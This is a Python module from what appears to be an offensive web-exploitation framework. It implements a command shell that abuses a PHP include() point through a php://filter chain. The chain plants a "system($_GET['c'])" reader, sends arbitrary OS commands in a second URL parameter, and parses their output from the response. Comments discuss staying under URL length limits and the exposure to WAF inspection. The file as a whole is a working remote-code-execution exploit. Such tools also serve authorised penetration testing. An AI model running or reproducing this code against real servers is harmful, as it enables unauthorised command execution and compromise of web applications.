"""Running commands through a generated filter chain.

The chain is built once and reused. A chain that carried the command would be a
new chain per command, and since every byte of payload costs about a hundred and
fifty characters of filter, a chain holding a real command line runs past the
length a web server will accept in a URL - the request is refused before the
application ever sees it.

So the chain carries a reader instead: a short PHP fragment that takes the
command from another parameter. One long request sets the session up, and each
command after that is a normal-sized request. The trade is that the command
travels in the clear in that second parameter, which is the wrong side of a WAF
that inspects values - but a chain that never arrives is worse than one that is
seen.
"""

from __future__ import annotations

import secrets
from urllib.parse import quote, urlsplit, urlunsplit

from ...core.filters import php_runner
from ...core.params import Encode, rewrite
from ...engine.inject import inject

# The name the command is passed under. Short, and unlikely to collide with
# something the application already reads.
AUX_PARAM = "c"

# What the chain manufactures. Deliberately tiny: every byte of payload costs
# roughly two hundred and fifty characters of filter chain, and a web server
# enforces a limit on the request line (8190 by default, which this chain stays
# well under). This is the whole reason the command travels in a second parameter
# instead of inside the chain.
#
# A PHP fragment, not a document: the generator opens the tag itself. Writing
# "<?php" here as well produces "<?php <?php ...", which parses as nothing and
# fails without a message.
READER = "system($_GET['%s']);"

# Where the chain ends. An application that reports what it included echoes the
# whole chain back, which makes this a reliable seam to cut at.
CHAIN_TAIL = "resource=php://temp"


class FilterChainShell:
    """A command runner backed by `php://filter` over an include() point."""

    def __init__(self, ctx, param, aux: str = AUX_PARAM, action: str = "os-shell") -> None:
        self.ctx = ctx
        self.param = param
        self.aux = aux
        self.action = action
        self._chain: str | None = None
        self._opened = ""
        self._closed = ""

    def __call__(self, command: str) -> str:
        chain = self._reader()
        request = rewrite(self.ctx.config["request"], self.param, chain, Encode.URL).clone()
        request.url = self._with_command(request.url, command)
        exchange = self.ctx.send(request, action=self.action)
        if exchange.response.error:
            return f"(no response: {exchange.response.error})"
        return self._extract(exchange.response.text)

    def _reader(self) -> str:
        """Build the reader chain once and keep it."""
        if self._chain is None:
            self._chain = php_runner(READER % self.aux)
        return self._chain

    def _with_command(self, url: str, command: str) -> str:
        parts = urlsplit(url)
        query = parts.query + ("" if not parts.query else "&") + f"{self.aux}={quote(command, safe='')}"
        return urlunsplit((parts.scheme, parts.netloc, parts.path, query, parts.fragment))

    def _extract(self, body: str) -> str:
        """The command's output, minus whatever the page wraps it in.

        There is no marker to look for: one would push the payload past the
        length a URL can carry. When the application echoes what it included, the
        end of the chain is a clean seam; when it does not, the whole response is
        the output. Either way the chain leaves some bytes of its own after the
        payload, so the result is cut at the first character that is not text.
        """
        index = body.find(CHAIN_TAIL)
        tail = body[index + len(CHAIN_TAIL):] if index != -1 else body
        if index != -1:
            tail = tail.lstrip("-)> \r\n")

        cut = len(tail)
        for position, character in enumerate(tail):
            if ord(character) < 32 and character not in "\n\r\t":
                cut = position
                break
        return tail[:cut].strip()
